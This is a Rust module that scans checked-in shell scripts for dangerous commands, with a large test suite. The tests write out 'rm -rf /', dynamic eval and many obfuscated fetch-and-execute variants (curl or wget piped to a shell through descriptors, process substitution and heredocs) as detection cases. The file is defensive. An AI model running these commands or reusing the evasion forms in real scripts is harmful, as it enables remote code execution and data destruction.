//! SURFSH-001 (file detection) + SURFSH-002 (dangerous-command scan) for the
//! shell-script governance surface (T1 — Scanned).
//!
//! Per `plans/modules/surface-shell.aps.md`, this surface **reuses** the
//! existing `command_safety` rule engine rather than duplicating its
//! catalogue: each command in a checked-in shell script is parsed and
//! analysed against the shared `default_filesystem_rules()` and
//! `default_shell_rules()` (`rm -rf /`, pipe-to-shell, dynamic `eval`,
//! numeric `chmod 777`). One catalogue, two consumers.
//!
//! Suppressions reuse the canonical Rust antipattern parser per
//! [ADR-029](../../../../plans/decisions/029-suppression-parser-authority.md);
//! the `#` comment style is already supported.
//!
//! Phase-1 scope: detection is extension-based (`*.sh`/`*.bash`) — shebang-only
//! scripts (no extension) are a documented follow-up. Shell-only rules
//! (`chmod 777`, `curl … | sh`, dynamic `eval`) live in the shared
//! `default_shell_rules()` pack (SURFSH-008).
//!
//! Known limitation (warn-only surface): a dangerous command on line 1 (no
//! preceding line) can't carry an `# @anvil-ignore` directive. Quoted and
//! non-shell heredoc bodies are skipped; executable unquoted shell heredocs
//! retain expansion semantics.

use std::collections::VecDeque;
use std::path::Path;

use serde::{Deserialize, Serialize};

use super::suppression::resolve_line_suppression;
use crate::command_safety::matcher::{ShellDescriptorState, analyse_compound_with_state};
use crate::command_safety::parser::{
    ShellCommentState, ends_with_open_pipe, heredoc_shell_consumers, parse_compound_command,
    shell_code_before_comment, shell_code_before_comment_with_state, shell_construct_is_open,
    shell_heredoc_payload_command, starts_with_pipe,
};
use crate::command_safety::rules::{default_filesystem_rules, default_shell_rules};
use crate::command_safety::types::{CommandAction, CommandRule, CommandSeverity};

/// SURFSH-002 — dangerous commands in checked-in shell scripts.
pub const SURFSH_002_RULE_ID: &str = "SURFSH-002";

/// True when `path` is a shell script by extension (`*.sh`/`*.bash`).
/// Shebang-only detection (`#!/bin/sh` with no extension) is a documented
/// Phase-1 follow-up.
#[must_use]
pub fn is_shell_file(path: &Path) -> bool {
    path.extension()
        .and_then(|e| e.to_str())
        .is_some_and(|e| e.eq_ignore_ascii_case("sh") || e.eq_ignore_ascii_case("bash"))
}

/// Severity of a shell finding, mapped from the shared command-safety rule.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ShellSeverity {
    Error,
    Warning,
    Info,
}

impl From<CommandSeverity> for ShellSeverity {
    fn from(s: CommandSeverity) -> Self {
        match s {
            CommandSeverity::Error => Self::Error,
            CommandSeverity::Warning => Self::Warning,
            CommandSeverity::Info => Self::Info,
        }
    }
}

/// A single SURFSH-002 finding, anchored to the offending command's line.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ShellFinding {
    pub file: String,
    /// 1-indexed line where the command's (logical) line starts.
    pub line: usize,
    /// The offending command, truncated for display.
    pub command: String,
    pub severity: ShellSeverity,
    /// Shared `command_safety` rule id (`pipe-to-shell`, `eval-dynamic`, …).
    pub rule_id: String,
    /// Why the shared catalogue flagged it.
    pub reason: String,
    pub suppressed: bool,
    pub suppression_reason: Option<String>,
}

/// Scan one shell script's `content` for dangerous commands (SURFSH-002),
/// reusing the shared `command_safety` filesystem ruleset.
#[must_use]
pub fn scan_shell(display_path: &str, content: &str) -> Vec<ShellFinding> {
    let mut rules = default_filesystem_rules();
    rules.extend(default_shell_rules());
    scan_shell_with_rules(display_path, content, &rules)
}

/// As [`scan_shell`] but with a caller-provided ruleset, so the aggregator
/// builds the (cloned) ruleset once per run rather than once per file.
#[must_use]
pub fn scan_shell_with_rules(
    display_path: &str,
    content: &str,
    rules: &[CommandRule],
) -> Vec<ShellFinding> {
    let lines: Vec<&str> = content.lines().collect();
    let mut findings = Vec::new();
    let mut descriptor_state = ShellDescriptorState::default();

    for instr in logical_lines(&lines) {
        // A line may be a compound command (`a && b | c`); analyse each part
        // plus pipeline-aware rules (pipe-to-shell).
        let compound = parse_compound_command(&instr.text);
        for analysis in analyse_compound_with_state(&compound, rules, None, &mut descriptor_state) {
            if matches!(analysis.action, CommandAction::Block | CommandAction::Warn) {
                let (suppressed, reason) =
                    resolve_line_suppression(&lines, instr.line, SURFSH_002_RULE_ID);
                findings.push(ShellFinding {
                    file: display_path.to_string(),
                    line: instr.line,
                    command: truncate(analysis.parsed_command.raw.trim()),
                    severity: analysis.severity.into(),
                    rule_id: analysis
                        .matched_rule
                        .as_ref()
                        .map(|rule| rule.id.clone())
                        .unwrap_or_default(),
                    reason: analysis
                        .reason
                        .unwrap_or_else(|| "flagged by command-safety rules".to_string()),
                    suppressed,
                    suppression_reason: reason,
                });
            }
        }
    }
    findings
}

const COMMAND_DISPLAY_CAP: usize = 120;

fn truncate(s: &str) -> String {
    if s.len() <= COMMAND_DISPLAY_CAP {
        return s.to_string();
    }
    let mut end = COMMAND_DISPLAY_CAP;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}…", &s[..end])
}

/// A logical shell line: `\`-continued physical lines joined, with the
/// 1-indexed start line. Full-line `#` comments (including the `#!` shebang)
/// are skipped.
struct LogicalLine {
    text: String,
    line: usize,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct HeredocOpener {
    pub(crate) marker: String,
    pub(crate) strip_tabs: bool,
    pub(crate) quoted: bool,
    pub(crate) shell: Option<String>,
    pub(crate) body: String,
    pub(crate) line: usize,
}

fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
    let mut out = Vec::new();
    let mut buf = String::new();
    let mut start: Option<usize> = None;
    let mut join_with_space = false;
    let mut comment_state = ShellCommentState::default();
    let mut heredocs: VecDeque<HeredocOpener> = VecDeque::new();

    for (idx, raw) in lines.iter().enumerate() {
        let line_number = idx + 1;

        if let Some(heredoc) = heredocs.front_mut() {
            let candidate = if heredoc.strip_tabs {
                raw.trim_start_matches('\t').trim_end()
            } else {
                raw.trim_end()
            };
            if candidate == heredoc.marker {
                let heredoc = heredocs.pop_front().expect("front heredoc exists");
                if !heredoc.quoted
                    && let Some(shell) = heredoc.shell
                    && !heredoc.body.is_empty()
                {
                    out.push(LogicalLine {
                        text: shell_heredoc_payload_command(&shell, &heredoc.body),
                        line: heredoc.line,
                    });
                }
            } else if !heredoc.quoted && heredoc.shell.is_some() {
                if !heredoc.body.is_empty() {
                    heredoc.body.push('\n');
                }
                heredoc.body.push_str(raw);
            }
            continue; // body data is either modelled above or skipped
        }

        let trimmed = raw.trim();
        // Only break on a comment when not mid-continuation; a `#` opening a
        // fresh line is a comment (shell comments run to end of line).
        if start.is_none() && (trimmed.is_empty() || trimmed.starts_with('#')) {
            continue;
        }
        let code = shell_code_before_comment_with_state(raw, &mut comment_state)
            .trim()
            .trim_end();
        if code.is_empty() {
            // A comment-only physical line does not close a pipeline that is
            // waiting for its next stage.
            join_with_space = ends_with_open_pipe(&buf);
            continue;
        }
        if start.is_none() {
            start = Some(line_number);
        }
        // A line continues on an odd trailing `\`, a trailing pipe, or when
        // the next physical line starts with `|` (pretty-printed pipelines).
        let next_starts_pipe = lines
            .get(idx + 1)
            .is_some_and(|next| starts_with_pipe(shell_code_before_comment(next)));
        let is_backslash_cont = ends_with_continuation(code);
        let body = if is_backslash_cont {
            code.strip_suffix('\\').unwrap_or(code).trim_end()
        } else {
            code
        };
        let separator = if join_with_space { " " } else { "\n" };
        let candidate = if buf.is_empty() {
            body.to_string()
        } else {
            format!("{buf}{separator}{body}")
        };
        let is_cont = is_backslash_cont
            || ends_with_open_pipe(body)
            || next_starts_pipe
            || shell_construct_is_open(&candidate);
        if !buf.is_empty() {
            buf.push_str(separator);
        }
        buf.push_str(body);
        join_with_space = is_backslash_cont || ends_with_open_pipe(body) || next_starts_pipe;
        if !is_cont {
            if !buf.trim().is_empty() {
                out.push(LogicalLine {
                    text: buf.clone(),
                    line: start.expect("start set"),
                });
            }
            // A heredoc opened on this logical line suppresses its body lines.
            heredocs.extend(heredoc_openers(&buf).into_iter().map(|mut opener| {
                opener.line = start.expect("start set");
                opener
            }));
            buf.clear();
            start = None;
            join_with_space = false;
        }
    }
    if let Some(line) = start
        && !buf.trim().is_empty()
    {
        out.push(LogicalLine { text: buf, line });
    }
    out
}

/// True when `s` ends with an odd number of backslashes (a real line
/// continuation, not an escaped `\\`).
fn ends_with_continuation(s: &str) -> bool {
    s.bytes().rev().take_while(|&b| b == b'\\').count() % 2 == 1
}

/// Return every heredoc delimiter opened by one logical instruction, in shell
/// consumption order. Operators inside quotes and arithmetic are data, while
/// quoted and numeric delimiter words are valid shell syntax.
pub(crate) fn heredoc_openers(instruction: &str) -> Vec<HeredocOpener> {
    let chars = instruction.chars().collect::<Vec<_>>();
    let mut openers = Vec::new();
    let mut index = 0usize;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut escaped = false;
    let mut arithmetic_depth = 0usize;
    let mut bracket_arithmetic_depth = 0usize;

    while index < chars.len() {
        let character = chars[index];
        if escaped {
            escaped = false;
            index += 1;
            continue;
        }
        if character == '\\' && !in_single_quote {
            escaped = true;
            index += 1;
            continue;
        }
        if arithmetic_depth > 0 {
            match character {
                '(' => arithmetic_depth += 1,
                ')' => arithmetic_depth = arithmetic_depth.saturating_sub(1),
                _ => {}
            }
            index += 1;
            continue;
        }
        if bracket_arithmetic_depth > 0 {
            match character {
                '[' => bracket_arithmetic_depth += 1,
                ']' => bracket_arithmetic_depth = bracket_arithmetic_depth.saturating_sub(1),
                _ => {}
            }
            index += 1;
            continue;
        }
        match character {
            '\'' if !in_double_quote => {
                in_single_quote = !in_single_quote;
                index += 1;
                continue;
            }
            '"' if !in_single_quote => {
                in_double_quote = !in_double_quote;
                index += 1;
                continue;
            }
            _ => {}
        }
        if in_single_quote || in_double_quote {
            index += 1;
            continue;
        }
        if chars.get(index..index + 3) == Some(&['$', '(', '(']) {
            arithmetic_depth = 2;
            index += 3;
            continue;
        }
        if chars.get(index..index + 2) == Some(&['(', '(']) {
            arithmetic_depth = 2;
            index += 2;
            continue;
        }
        if chars.get(index..index + 2) == Some(&['$', '[']) {
            bracket_arithmetic_depth = 1;
            index += 2;
            continue;
        }
        if chars.get(index..index + 2) != Some(&['<', '<']) {
            index += 1;
            continue;
        }
        // Here-strings have no following body.
        if chars.get(index + 2) == Some(&'<') {
            index += 3;
            continue;
        }
        index += 2;
        let strip_tabs = chars.get(index) == Some(&'-');
        if strip_tabs {
            index += 1;
        }
        while chars
            .get(index)
            .is_some_and(|character| character.is_whitespace())
        {
            index += 1;
        }
        let (marker, next_index, quoted) = heredoc_delimiter(&chars, index);
        index = next_index;
        if let Some(marker) = marker {
            openers.push((marker, strip_tabs, quoted));
        }
    }
    attach_heredoc_consumers(openers, instruction)
}

fn attach_heredoc_consumers(
    openers: Vec<(String, bool, bool)>,
    instruction: &str,
) -> Vec<HeredocOpener> {
    let mut consumers = heredoc_shell_consumers(instruction).into_iter();
    openers
        .into_iter()
        .map(|(marker, strip_tabs, quoted)| HeredocOpener {
            marker,
            strip_tabs,
            quoted,
            shell: consumers.next().flatten(),
            body: String::new(),
            line: 0,
        })
        .collect()
}

fn heredoc_delimiter(chars: &[char], mut index: usize) -> (Option<String>, usize, bool) {
    let mut marker = String::new();
    let mut word_present = false;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut escaped = false;
    let mut ansi_c_quote = false;
    let mut quoted = false;
    while let Some(&character) = chars.get(index) {
        if escaped {
            word_present = true;
            marker.push(character);
            escaped = false;
            index += 1;
            continue;
        }
        if ansi_c_quote && character == '\\' {
            let (decoded, next_index) = decode_ansi_c_escape(chars, index);
            marker.push_str(&decoded);
            word_present = true;
            index = next_index;
            continue;
        }
        if character == '\\' && !in_single_quote {
            word_present = true;
            quoted = true;
            escaped = true;
            index += 1;
            continue;
        }
        match character {
            '\'' if !in_double_quote => {
                word_present = true;
                quoted = true;
                in_single_quote = !in_single_quote;
                if !in_single_quote {
                    ansi_c_quote = false;
                }
            }
            '"' if !in_single_quote => {
                word_present = true;
                quoted = true;
                in_double_quote = !in_double_quote;
            }
            character
                if !in_single_quote
                    && !in_double_quote
                    && (character.is_whitespace()
                        || matches!(character, ';' | '|' | '&' | '<' | '>')) =>
            {
                break;
            }
            _ => {
                if !in_single_quote
                    && !in_double_quote
                    && character == '$'
                    && matches!(chars.get(index + 1), Some('\'' | '"'))
                {
                    word_present = true;
                    quoted = true;
                    ansi_c_quote = chars.get(index + 1) == Some(&'\'');
                    index += 1;
                    continue;
                }
                word_present = true;
                marker.push(character);
            }
        }
        index += 1;
    }
    (word_present.then_some(marker), index, quoted)
}

fn decode_ansi_c_escape(chars: &[char], slash: usize) -> (String, usize) {
    let Some(&escaped) = chars.get(slash + 1) else {
        return ("\\".to_string(), slash + 1);
    };
    if matches!(escaped, 'x' | 'u' | 'U') {
        let digits = match escaped {
            'x' => 2,
            'u' => 4,
            'U' => 8,
            _ => unreachable!(),
        };
        return decode_ansi_digits(chars, slash + 2, digits, 16)
            .unwrap_or_else(|| (escaped.to_string(), slash + 2));
    }
    if escaped.is_digit(8) {
        return decode_ansi_digits(chars, slash + 1, 3, 8)
            .unwrap_or_else(|| (escaped.to_string(), slash + 2));
    }
    let decoded = match escaped {
        'a' => '\u{0007}',
        'b' => '\u{0008}',
        'e' | 'E' => '\u{001b}',
        'f' => '\u{000c}',
        'n' => '\n',
        'r' => '\r',
        't' => '\t',
        'v' => '\u{000b}',
        '\n' => return (String::new(), slash + 2),
        other => other,
    };
    (decoded.to_string(), slash + 2)
}

fn decode_ansi_digits(
    chars: &[char],
    start: usize,
    max_digits: usize,
    radix: u32,
) -> Option<(String, usize)> {
    let digits = chars[start..]
        .iter()
        .take(max_digits)
        .take_while(|character| character.is_digit(radix))
        .collect::<String>();
    if digits.is_empty() {
        return None;
    }
    let value = u32::from_str_radix(&digits, radix).ok()?;
    let decoded = char::from_u32(value)?;
    Some((decoded.to_string(), start + digits.len()))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn findings(content: &str) -> Vec<ShellFinding> {
        scan_shell("deploy.sh", content)
    }

    #[test]
    fn detects_shell_files_by_extension() {
        assert!(is_shell_file(Path::new("scripts/deploy.sh")));
        assert!(is_shell_file(Path::new("build.bash")));
        assert!(is_shell_file(Path::new("CI/RUN.SH")));
        assert!(!is_shell_file(Path::new("src/main.rs")));
        assert!(!is_shell_file(Path::new("notes.md")));
    }

    #[test]
    fn flags_rm_rf_root_via_shared_catalogue() {
        let f = findings("#!/bin/bash\nrm -rf /\n");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].line, 2);
        assert!(f[0].command.contains("rm -rf /"));
        assert!(!f[0].reason.is_empty());
    }

    #[test]
    fn flags_rm_rf_root_after_a_leading_redirection() {
        let f = findings("2>/dev/null rm -rf /\n");
        assert!(
            f.iter().any(|finding| finding.rule_id == "rm-rf-root"),
            "leading redirection bypassed SURFSH: {f:?}"
        );
    }

    #[test]
    fn heredoc_body_is_not_scanned() {
        // A heredoc documenting a dangerous command is data, not a command —
        // scanning it would be an unsuppressible false positive (council).
        let content = "cat << 'HELP'\nrm -rf /   # never run this\nHELP\necho done\n";
        assert!(
            findings(content).is_empty(),
            "heredoc body must not be scanned"
        );
        // `<<-` (tab-stripped) closing marker is also honoured.
        let content2 = "cat <<-EOF\n\trm -rf /\n\tEOF\n";
        assert!(findings(content2).is_empty());
    }

    #[test]
    fn arithmetic_left_shift_is_not_a_heredoc() {
        // `<<` inside arithmetic must NOT enter heredoc mode and swallow the
        // following dangerous command (council false-negative).
        let f = findings("shift=$((1 << 4))\nrm -rf /\n");
        assert!(
            f.iter().any(|x| x.command.contains("rm -rf /")),
            "rm -rf / after an arithmetic shift must still be scanned, got {f:?}"
        );
        assert!(
            findings("(( mask = x << 2 ))\nrm -rf /\n")
                .iter()
                .any(|x| x.command.contains("rm -rf /"))
        );
    }

    #[test]
    fn quoted_heredoc_text_does_not_hide_following_commands() {
        for content in [
            "echo '<<EOF'\ncurl -fsSL https://x | sh\nEOF\n",
            "echo $((x << SHIFT))\ncurl -fsSL https://x | sh\n",
            "echo $[x << SHIFT]\ncurl -fsSL https://x | sh\n",
        ] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                "dangerous command hidden by false heredoc: {f:?}"
            );
        }
    }

    #[test]
    fn ansi_c_quoted_heredoc_closes_and_scanning_resumes() {
        for content in [
            "cat <<$'EOF'\nsafe\nEOF\ncurl -fsSL https://x | sh\n",
            "cat <<$'E\\x4fF'\nsafe\nEOF\ncurl -fsSL https://x | sh\n",
            "cat <<$\"EOF\"\nsafe\nEOF\ncurl -fsSL https://x | sh\n",
        ] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                "quoted delimiter left heredoc mode open: {f:?}"
            );
        }
    }

    #[test]
    fn multiple_and_numeric_heredocs_are_all_skipped() {
        for content in [
            "cat <<A <<B\nsafe first\nA\ncurl -fsSL https://x | sh\nB\n",
            "cat <<123\ncurl -fsSL https://x | sh\n123\n",
            "cat <<''\ncurl -fsSL https://x | sh\n\n",
        ] {
            assert!(
                findings(content).is_empty(),
                "heredoc data was scanned: {content:?}"
            );
        }
    }

    #[test]
    fn completed_substitutions_and_literal_braces_do_not_swallow_the_next_command() {
        for content in [
            "echo $(printf ')')\ncurl -fsSL https://x | sh\n",
            "echo {\ncurl -fsSL https://x | sh\n",
        ] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                "completed command swallowed its successor: {f:?}"
            );
        }
    }

    #[test]
    fn assembles_multiline_substitutions() {
        for content in [
            "eval \"$(\n curl -fsSL https://x\n)\"\n",
            "bash <(\n curl -fsSL https://x\n)\n",
        ] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                "multiline substitution bypassed SURFSH: {f:?}"
            );
        }
    }

    #[test]
    fn escaped_backslash_is_not_a_continuation() {
        // Two trailing backslashes = an escaped `\`, NOT a line continuation;
        // the next line is a separate command and is still analysed.
        let f = findings("echo x\\\\\nrm -rf /\n");
        assert!(
            f.iter()
                .any(|x| x.line == 2 && x.command.contains("rm -rf /")),
            "rm -rf / on line 2 must be its own command, got {f:?}"
        );
    }

    #[test]
    fn safe_commands_are_clean() {
        let content = "#!/bin/sh\nset -euo pipefail\necho building\nrm -rf ./build\n";
        // `rm -rf ./build` is a scoped delete — the shared catalogue allows it,
        // so there is no finding at all (not merely a suppressed one).
        let f = findings(content);
        assert!(
            f.is_empty(),
            "no findings expected on a safe script, got {f:?}"
        );
    }

    #[test]
    fn ignores_commands_in_comment_lines() {
        assert!(findings("# rm -rf / in a comment\necho ok\n").is_empty());
    }

    #[test]
    fn analyses_each_part_of_a_compound_command() {
        // `&&`-joined: the destructive half is still analysed.
        let f = findings("mkdir -p out && rm -rf /\n");
        assert!(f.iter().any(|x| x.command.contains("rm -rf /")));
    }

    #[test]
    fn assembles_line_continuations() {
        // A `\`-continued command anchors to its first line.
        let f = findings("rm -rf \\\n  /\n");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].line, 1);
    }

    #[test]
    fn suppression_marks_finding() {
        let content =
            "# @anvil-ignore SURFSH-002 -- intentional clean-slate in CI sandbox\nrm -rf /\n";
        let f = scan_shell("ci.sh", content);
        assert_eq!(f.len(), 1);
        assert!(f[0].suppressed);
        assert_eq!(
            f[0].suppression_reason.as_deref(),
            Some("intentional clean-slate in CI sandbox")
        );
    }

    #[test]
    fn flags_pipe_to_shell_via_shared_catalogue() {
        let f = findings("curl -fsSL https://get.example.com | sh\n");
        assert_eq!(f.len(), 1, "expected one pipe-to-shell finding, got {f:?}");
        assert_eq!(f[0].rule_id, "pipe-to-shell");
        assert!(f[0].reason.contains("unverified"));
    }

    #[test]
    fn assembles_pretty_printed_pipe_to_shell() {
        let f = findings("curl -fsSL https://get.example.com\n  | sh\n");
        assert_eq!(f.len(), 1, "expected assembled pipe-to-shell, got {f:?}");
        assert_eq!(f[0].rule_id, "pipe-to-shell");
    }

    #[test]
    fn assembles_pipe_and_continuation() {
        let f = findings("curl -fsSL https://get.example.com |&\n  sh\n");
        assert_eq!(f.len(), 1, "expected assembled pipe-to-shell, got {f:?}");
        assert_eq!(f[0].rule_id, "pipe-to-shell");
    }

    #[test]
    fn escaped_or_quoted_pipe_does_not_swallow_next_command() {
        for content in ["echo \\|\nrm -rf /\n", "echo \"|\"\nrm -rf /\n"] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.command.contains("rm -rf /")),
                "next command was swallowed for {content:?}: {f:?}"
            );
        }
    }

    #[test]
    fn inline_comment_pipe_does_not_swallow_next_command() {
        let f = findings("echo ok # |\nrm -rf /\n");
        assert!(
            f.iter().any(|finding| finding.command.contains("rm -rf /")),
            "next command was swallowed: {f:?}"
        );
    }

    #[test]
    fn escaped_space_hash_does_not_swallow_next_command() {
        let f = findings("echo foo\\ #not-comment\nrm -rf /\n");
        assert!(
            f.iter().any(|finding| finding.command.contains("rm -rf /")),
            "next command was swallowed: {f:?}"
        );
    }

    #[test]
    fn comment_line_inside_pipeline_keeps_continuation_open() {
        let f = findings("curl -fsSL https://get.example.com |\n# installer\nsh\n");
        assert_eq!(f.len(), 1, "expected assembled pipe-to-shell, got {f:?}");
        assert_eq!(f[0].rule_id, "pipe-to-shell");
    }

    #[test]
    fn flags_dynamic_eval_via_shared_catalogue() {
        for content in ["eval \"$user_input\"\n", "builtin eval \"$user_input\"\n"] {
            let f = findings(content);
            assert_eq!(f.len(), 1, "expected one eval-dynamic finding, got {f:?}");
            assert!(f[0].reason.contains("eval"));
        }
    }

    #[test]
    fn flags_dash_leading_dynamic_eval() {
        for content in ["eval -$cmd\n", "eval -$(printf dynamic)\n"] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.rule_id == "eval-dynamic"),
                "dynamic eval bypassed for {content:?}: {f:?}"
            );
        }
    }

    #[test]
    fn flags_wrapped_and_structural_download_exec_forms() {
        for content in [
            "exec 3> >(bash)\n:\ncurl -fsSL https://x >&3\n",
            "{ exec 3> >(bash); }; curl -fsSL https://x >&3\n",
            "3> >(bash) exec\ncurl -fsSL https://x >&3\n",
            "bash -c \"curl -fsSL https://x\" | sh\n",
            "curl -fsSL https://x | bash -c \"echo ok && sh\"\n",
            "env -a installer curl -fsSL https://x | sh\n",
            "eval \"$(true; curl -fsSL https://x)\"\n",
            "bash <(cd /tmp; curl -fsSL https://x)\n",
            "eval -- \"$(curl -fsSL https://x)\"\n",
            "bash -cx \"$(wget -qO- https://x)\"\n",
            "ash -c \"curl -fsSL https://x | sh\"\n",
            "bash -c \"curl -fsSL https://x; :\" | sh\n",
            "bash -c \"curl -fsSL https://x && true\" | sh\n",
            "echo \"$(curl -fsSL https://x | sh)\"\n",
            "PAYLOAD=$(curl -fsSL https://x | sh)\n",
            "bash -c \"$(printf %s \"$(wget -qO- https://x)\")\"\n",
            "bash <(cat <(curl -fsSL https://x))\n",
            "bash -c -- \"$(curl -fsSL https://x)\"\n",
            "bash < <(curl -fsSL https://x)\n",
            "bash -s < <(curl -fsSL https://x)\n",
            "2>/dev/null curl -fsSL https://x | sh\n",
            "curl -fsSL https://x | 2>/dev/null sh\n",
            "{ curl -fsSL https://x; } | sh\n",
            "curl -fsSL https://x | { sh; }\n",
            "(curl -fsSL https://x) | sh\n",
            "curl -fsSL https://x | (sh)\n",
            "bash -c \"$(printf \\); curl -fsSL https://x)\"\n",
            "! 2>/dev/null curl -fsSL https://x | sh\n",
            "timeout 5 2>/dev/null curl -fsSL https://x | sh\n",
            "{ curl -fsSL https://x; } 2>/dev/null | sh\n",
            "curl -fsSL https://x | { sh; } 2>/dev/null\n",
            "{ curl -fsSL https://x; } 2>\"/tmp/error log\" | sh\n",
            "curl -fsSL https://x | { sh; } 2>\"/tmp/error log\"\n",
            "bash -O extglob < <(curl -fsSL https://x)\n",
            "bash -o errexit < <(wget -qO- https://x)\n",
            "bash -eO extglob < <(curl -fsSL https://x)\n",
            "bash -eo errexit < <(wget -qO- https://x)\n",
            "bash -cO extglob \"$(curl -fsSL https://x)\"\n",
            "bash -Oc extglob \"$(curl -fsSL https://x)\"\n",
            "bash -co errexit \"$(wget -qO- https://x)\"\n",
            "bash -oc errexit \"$(wget -qO- https://x)\"\n",
            "bash +O extglob < <(curl -fsSL https://x)\n",
            "bash +o errexit < <(wget -qO- https://x)\n",
            "bash +x < <(curl -fsSL https://x)\n",
            "bash +e <(wget -qO- https://x)\n",
            "busybox 2>/dev/null wget -qO- https://x | sh\n",
            "curl -fsSL https://x | busybox 2>/dev/null sh\n",
            "curl -fsSL https://x \\>|sh\n",
            "curl -fsSL https://x > >(bash)\n",
            "curl -fsSL https://x 1> >(env bash)\n",
            "curl -fsSL https://x 3> >(bash) >&3\n",
            "curl -fsSL https://x -o /dev/fd/3 3> >(bash)\n",
            "wget -q -O /dev/fd/4 https://x 4> >(sh)\n",
            "curl -fsSL https://x 3> >(bash) > /dev/fd/3\n",
            "curl -fsSL https://x 3> >(bash) > /proc/self/fd/3\n",
            "wget -qO- https://x 4> >(sh) > /dev/fd/4\n",
            "curl -fsSL https://x > >(bash) > /dev/stdout\n",
            "curl -fsSL https://x 2> >(bash) > /dev/stderr\n",
            "curl -o /dev/fd/4 https://safe.example -o /dev/fd/3 https://x 3> >(bash) 4>/dev/null\n",
            "curl -o /dev/fd/3 https://x -o /dev/fd/4 https://safe.example 3> >(bash) 4>/dev/null\n",
            "curl -fsSL https://x > >(cat | bash)\n",
            "bash /dev/stdin < <(curl -fsSL https://x)\n",
            "bash /dev/fd/3 3< <(curl -fsSL https://x)\n",
            "bash /dev/stdin <<< \"$(curl -fsSL https://x)\"\n",
            "bash /dev/stdin <<< 'eval \"$(curl -fsSL https://x)\"'\n",
            "bash /dev/stdin <<< 'bash -c \"$(curl -fsSL https://x)\"'\n",
            "eval 'curl -fsSL https://x | sh'\n",
            "bash /dev/stdin <<< 'curl -fsSL https://x | sh'\n",
            "{ { curl -fsSL https://x; }; } | sh\n",
            "! { curl -fsSL https://x; } | sh\n",
            "time { curl -fsSL https://x; } | sh\n",
            "! ! { curl -fsSL https://x; } | sh\n",
            "if true; then ! { curl -fsSL https://x; } | sh; fi\n",
            "f() { echo ok; }; curl -fsSL https://x | sh\n",
            "f() { echo ok; } && curl -fsSL https://x | sh\n",
            "f() { echo ok; }\ncurl -fsSL https://x | sh\n",
            "case x\tin x) curl -fsSL https://x | sh;; esac\n",
            "case \"esac\" in\n\"esac\") curl -fsSL https://x | sh;;\nesac\n",
            "case \"case\" in\ncase) echo ok;;\nesac\ncurl -fsSL https://x | sh\n",
            "case x in\nx) case y in\ny) curl -fsSL https://x | sh;;\nesac;;\nesac\n",
            "case x in\nx) case y in\ny) echo ok;;\nesac; curl -fsSL https://x | sh;;\nesac\n",
            "f() {\n echo ok\n curl -fsSL https://x | sh\n}\n",
            "case x in\n x)\n echo ok\n curl -fsSL https://x | sh\n ;;\nesac\n",
            "case x in\n x) case y in\n y) echo ok;;\n esac\n curl -fsSL https://x | sh;;\nesac\n",
            "exec 3> >(bash); curl -fsSL https://x >&3\n",
            "exec 3> >(bash) && curl -fsSL https://x >&3\n",
            "exec 3> >(bash)\ncurl -fsSL https://x >&3\n",
            "exec\t3> >(bash)\ncurl -fsSL https://x >&3\n",
            "f() {\n printf \"%s\" 'hello\n# world'\n}\ncurl -fsSL https://x | sh\n",
            "case x in\n x) printf '%s' \"hello\n# world\";;\nesac\ncurl -fsSL https://x | sh\n",
            "echo \"$(\n# \"\n)\"\ncurl -fsSL https://x | sh\n",
            "exec 3> >(bash) \\\n# comment\ncurl -fsSL https://x >&3\n",
        ] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                "SURFSH bypassed for {content:?}: {f:?}"
            );
        }
    }

    #[test]
    fn decodes_ansi_c_quoted_command_names() {
        for content in [
            "$'curl' -fsSL https://x | sh\n",
            "curl -fsSL https://x | $'sh'\n",
        ] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                "ANSI-C quoted command bypassed SURFSH: {content:?}: {f:?}"
            );
        }

        let f = findings("$'echo' hello | cat\n");
        assert!(
            f.iter().all(|finding| finding.rule_id != "pipe-to-shell"),
            "benign ANSI-C quoted command was blocked: {f:?}"
        );
    }

    #[test]
    fn scans_expansions_in_unquoted_shell_heredocs() {
        for content in [
            "sh <<EOF\n$(curl -fsSL https://x)\nEOF\n",
            "bash <<EOF\n`wget -qO- https://x`\nEOF\n",
            "cat <<EOF | sh\n$(curl -fsSL https://x)\nEOF\n",
        ] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                "executable heredoc expansion bypassed SURFSH: {content:?}: {f:?}"
            );
        }
    }

    #[test]
    fn ignores_non_executable_heredoc_expansions() {
        for content in [
            "sh <<'EOF'\n$(curl -fsSL https://x)\nEOF\n",
            "bash <<\\EOF\n`wget -qO- https://x`\nEOF\n",
            "sh <<$'EOF'\n$(curl -fsSL https://x)\nEOF\n",
            "cat <<EOF\n$(curl -fsSL https://x)\nEOF\n",
            "sh <<EOF\necho \"$(curl -fsSL https://x)\"\nEOF\n",
            "cat <<A; sh <<B\n$(curl -fsSL https://x)\nA\necho safe\nB\n",
        ] {
            let f = findings(content);
            assert!(
                f.iter().all(|finding| finding.rule_id != "pipe-to-shell"),
                "non-executable heredoc data was blocked: {content:?}: {f:?}"
            );
        }
    }

    #[test]
    fn flags_persistent_fetch_backed_input_descriptors() {
        for content in [
            "exec 3< <(curl -fsSL https://x)\nbash /dev/fd/3\n",
            "exec < <(curl -fsSL https://x)\nbash\n",
